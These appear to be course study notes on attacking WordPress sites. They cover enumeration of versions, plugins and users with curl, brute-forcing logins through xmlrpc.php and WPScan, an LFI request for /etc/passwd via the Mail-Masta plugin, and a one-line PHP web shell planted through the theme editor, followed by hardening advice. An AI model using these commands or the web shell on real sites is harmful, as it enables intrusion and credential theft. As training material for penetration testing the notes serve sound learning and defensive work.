WordPress is the most popular open source CMS
Multiple uses
	Blogs, e-commerce, project management, document management

## What is a CMS 
A content management system, that provides a WYSIWYG(What You See Is What You Get) Mockup editor

A CMS is made up of two key components:

- A Content Management Application (CMA) - the interface used to add and manage content.
- A Content Delivery Application (CDA) - the backend that takes the input entered into the CMA and assembles the code into a working, visually appealing website.

## Default Wordpress File Structure
LAMP stack (Linux operating system, Apache HTTP Server, MySQL database, and the PHP programming language) before installation on a Linux host

After installation, all WordPress supporting files and directories will be accessible in the webroot located at `/var/www/html.`

### File Structure
```shell-session
├── index.php
├── license.txt
├── readme.html
├── wp-activate.php
├── wp-admin
├── wp-blog-header.php
├── wp-comments-post.php
├── wp-config.php
├── wp-config-sample.php
├── wp-content
├── wp-cron.php
├── wp-includes
├── wp-links-opml.php
├── wp-load.php
├── wp-login.php
├── wp-mail.php
├── wp-settings.php
├── wp-signup.php
├── wp-trackback.php
└── xmlrpc.php
```

*index.php*: Homepage of website
*license.txt*: contains information about the version of the website
*wp-activate.php*: used for email activation when setting up new wordpress site
*wp-admin* folder containing the following 
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
`xmlrpc.php` is a file representing a feature of WordPress that enables data to be transmitted with HTTP acting as the transport mechanism and XML as the encoding mechanism. 
*Wp-config.php*: information about wp, all database connections keys and salts.
*WP-content*: stores plugins and themes
*WP-includes*: contains everything except administrative components.

## WordPress User Roles
| Role          | Description                                                                                                                                            |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Administrator | This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code. |
| Editor        | An editor can publish and manage posts, including the posts of other users.                                                                            |
| Author        | Authors can publish and manage their own posts.                                                                                                        |
| Contributor   | These users can write and manage their own posts but cannot publish them.                                                                              |
| Subscriber    | These are normal users who can browse posts and edit their profiles.                                                                                   |
*Gaining Administrator Access is usually needed for RCE*

## WordPress Core Version Enumeration
Important to know what version of the software we're running to cross reference vulnerabilities.

*Easiest way is to review the pages source code and look for the `Meta-Generator` tag*
```shell-session
<meta name="generator" content="WordPress 5.3.3" />
```
Good to also check the CSS Files and Javascript

## Plugins and Theme Enumeration
We can find version details and information about installed plugins from cURL
```shell-session
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2
```

Response headers may also contain version numbers for specific plugin.

Not all plugins can be enumerated passively, some need active requests.
We can curl 
```shell-session
/wp-content/plugins
```

## Directory Indexing
Active plugins shouldn't be the main focus of our search, even if a plugin is deactivated it may still be accessible. 
Directory indexing can be disabled on servers to stop potential attackers easily enumerating.

## User Enumeration
Enumerating a valid list of users is a critical phase.
With this list we can guess default credentials or preform brute-force attacks.
This can be leveraged to modify the word-press website or even interact with the underlying server.

### Method 1:
The first method is reviewing posts to uncover the ID assigned to the user and their corresponding username.
*if we see a post by admin we can hover over it to find the associated username in the bottom left corner *

The admin user is usually assigned id 1 we can confirm this with 
`http://blog.inlanefreight.com/?author=1`
#### Existing User
If we send a curl
```shell-session
curl -s -I http://blog.inlanefreight.com/?author=1
```
If the user exists we will get a 302 redirect, if the user does not exist it will 404

### Method 2:
Possible to interact with a JSON endpoint 
Versions after `4.7.1` only disclose whether a user is configured or not
```shell-session
curl http://blog.inlanefreight.com/wp-json/wp/v2/users
```

## Login
Brute Force attack can be preformed against login page or `xmlrpc.php` 

```shell-session
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

If credentials are correct we will Receive and XML response vs a 403 for wrong credentials.
```
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>
```
to list methods
## WPSCAN 
Automatic tool to enum wordpress sites.
`--enumerate` flag is used to enumerate.

## Exploiting a vulnerable plugin
WPSCAN has told us about several vulnerabilities 
- WP is out of date (5.3.2)
- Vulnerable Theme (Twenty Twenty)
- Mail-Masta(1.0)
- Google-Review-Slider 

This version of Mail-Masta is vulnerable to LFI through the URL
````shell-session
http://blog.inlanefreight.com/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
````

## Attacking WordPress Users 
WPscan can be used to brute force usernames and passwords. `--password-attack`
Uses two methods:
	Via wp-Login (slower)
	Via xmlrpc (fast)
```shell-session
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com
```

***SEEMS SLOW AF*** TODO FIND WAY TO HYDRA

## RCE Via Theme Editor
With admin access to word press we can modify the PHP source code to exploit commands.
`Appearance>Theme Editor` which will take us to the php source code.
*We should swap to an inactive theme to not corrupt the main theme.*
add a php web shell 
```php
<?php

system($_GET['cmd']);
```

If we pick a page that is infrequently viewed `404.php` we can then access our web shell via the page

## Attacking WordPress with MetaSploit
Metasploit has the capability to gain a reverse shell from admin credentials
`wp_admin_shell_upload`

## WP Hardening
UPDATE!
modify `wp-config`
```php
define( 'WP_AUTO_UPDATE_CORE', true );
```

```php
add_filter( 'auto_update_plugin', '__return_true' );
```

```php
add_filter( 'auto_update_theme', '__return_true' );
```
turn off indexing
- Disable the standard `admin` user and create accounts with difficult to guess usernames
- Enforce strong passwords
- Enable and enforce two-factor authentication (2FA) for all users
- Restrict users' access based on the concept of least privilege
- Periodically audit user rights and access. Remove any unused accounts or revoke access that is no longer needed
- Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
- Limit login attempts to prevent password brute-forcing attacks
- Rename the `wp-admin.php` login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses